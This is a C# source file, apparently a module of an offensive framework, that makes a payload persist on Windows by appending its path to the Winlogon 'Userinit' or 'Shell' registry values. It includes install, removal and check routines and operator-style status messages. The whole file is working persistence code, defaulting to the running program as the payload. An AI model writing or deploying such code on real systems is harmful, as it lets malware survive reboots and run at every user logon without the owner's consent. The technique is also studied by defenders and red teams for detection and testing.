using System;
using System.Linq;
using Microsoft.Win32;

namespace Framework.Modules
{
    public static class Worker
    {
        private const string RegPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon";
        private const string UserInitKey = "Userinit";
        private const string ShellKey = "Shell";

        private const string UserInitDefault = @"C:\Windows\system32\userinit.exe,";
        private const string ShellDefault = "explorer.exe";

        private static string GetDefaultPayloadPath()
        {
            try
            {
                return System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            }
            catch
            {
                return @"C:\Windows\System32\cmd.exe";
            }
        }

        public static string Info(string[] args)
        {
            string defaultPayload = GetDefaultPayloadPath();

            return $"[i] Default Start Command Parameters:\n" +
                   $"    R2 winlogon Start userinit {defaultPayload}\n" +
                   $"    (Target keys: 'userinit', 'shell')";
        }

        public static string Start(string[] args)
        {
            string targetKey = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : "userinit";

            string payloadPath = (args != null && args.Length > 1 && !string.IsNullOrWhiteSpace(args[1]))
                ? args[1]
                : GetDefaultPayloadPath();

            try
            {
                using var regKey = Registry.LocalMachine.OpenSubKey(RegPath, writable: true);
                if (regKey == null)
                    return "[-] Access denied opening Winlogon registry key. Run as administrator.";

                string valueName = ResolveValueName(targetKey);
                string currentValue = regKey.GetValue(valueName)?.ToString() ?? GetDefault(targetKey);

                if (currentValue.IndexOf(payloadPath, StringComparison.OrdinalIgnoreCase) >= 0)
                    return $"[*] Payload already present in Winlogon '{valueName}' value.";

                string separator = valueName.Equals(UserInitKey, StringComparison.OrdinalIgnoreCase) ? "," : " ";
                string newValue = currentValue.TrimEnd(',', ' ') + separator + payloadPath;

                regKey.SetValue(valueName, newValue, RegistryValueKind.String);
                return $"[+] Installed '{payloadPath}' appended to Winlogon '{valueName}' -> Full Value: '{newValue}'";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied. Winlogon modifications require administrator privileges.";
            }
            catch (Exception ex)
            {
                return $"[-] Error during installation: {ex.Message}";
            }
        }

        public static string Stop(string[] args)
        {
            string targetKey = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : "userinit";

            string payloadPath = (args != null && args.Length > 1 && !string.IsNullOrWhiteSpace(args[1]))
                ? args[1]
                : GetDefaultPayloadPath();

            try
            {
                using var regKey = Registry.LocalMachine.OpenSubKey(RegPath, writable: true);
                if (regKey == null)
                    return "[-] Access denied opening Winlogon registry key. Run as administrator.";

                string valueName = ResolveValueName(targetKey);
                string currentValue = regKey.GetValue(valueName)?.ToString() ?? GetDefault(targetKey);

                if (currentValue.IndexOf(payloadPath, StringComparison.OrdinalIgnoreCase) < 0)
                    return $"[*] Payload '{payloadPath}' not found in Winlogon '{valueName}'.";

                string newValue = RemoveFromValue(currentValue, payloadPath, targetKey);

                regKey.SetValue(valueName, newValue, RegistryValueKind.String);
                return $"[+] Removed '{payloadPath}' from Winlogon '{valueName}'. Restored: '{newValue}'";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied. Winlogon modifications require administrator privileges.";
            }
            catch (Exception ex)
            {
                return $"[-] Error during removal: {ex.Message}";
            }
        }

        public static string Check(string[] args)
        {
            string targetKey = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : "userinit";

            string payloadPath = (args != null && args.Length > 1 && !string.IsNullOrWhiteSpace(args[1]))
                ? args[1]
                : GetDefaultPayloadPath();

            try
            {
                using var regKey = Registry.LocalMachine.OpenSubKey(RegPath, writable: false);
                if (regKey == null)
                    return "[-] Access denied opening Winlogon registry key.";

                string valueName = ResolveValueName(targetKey);
                string currentValue = regKey.GetValue(valueName)?.ToString() ?? GetDefault(targetKey);

                bool containsPayload = currentValue.IndexOf(payloadPath, StringComparison.OrdinalIgnoreCase) >= 0;

                return $"[+] Verified Winlogon '{valueName}' | Value: '{currentValue}' | Target Present: {containsPayload}";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied inspecting Winlogon registry parameters.";
            }
            catch (Exception ex)
            {
                return $"[-] Error during verification: {ex.Message}";
            }
        }

        // ─── Helpers ─────────────────────────────────────────────────────────────

        private static string ResolveValueName(string keyId) =>
            "userinit".Equals(keyId, StringComparison.OrdinalIgnoreCase) ? UserInitKey : ShellKey;

        private static string GetDefault(string keyId) =>
            "userinit".Equals(keyId, StringComparison.OrdinalIgnoreCase) ? UserInitDefault : ShellDefault;

        private static string RemoveFromValue(string currentValue, string payload, string keyId)
        {
            char delimiter = "userinit".Equals(keyId, StringComparison.OrdinalIgnoreCase) ? ',' : ' ';

            var entries = currentValue
                .Split(new[] { delimiter }, StringSplitOptions.RemoveEmptyEntries)
                .Select(e => e.Trim())
                .Where(e => !e.Equals(payload, StringComparison.OrdinalIgnoreCase))
                .ToList();

            if (entries.Count == 0)
                return GetDefault(keyId);

            string rejoined = string.Join(delimiter.ToString(), entries);

            // Windows standard userinit ends with a trailing comma
            if ("userinit".Equals(keyId, StringComparison.OrdinalIgnoreCase) && !rejoined.EndsWith(","))
                rejoined += ",";

            return rejoined;
        }
    }
}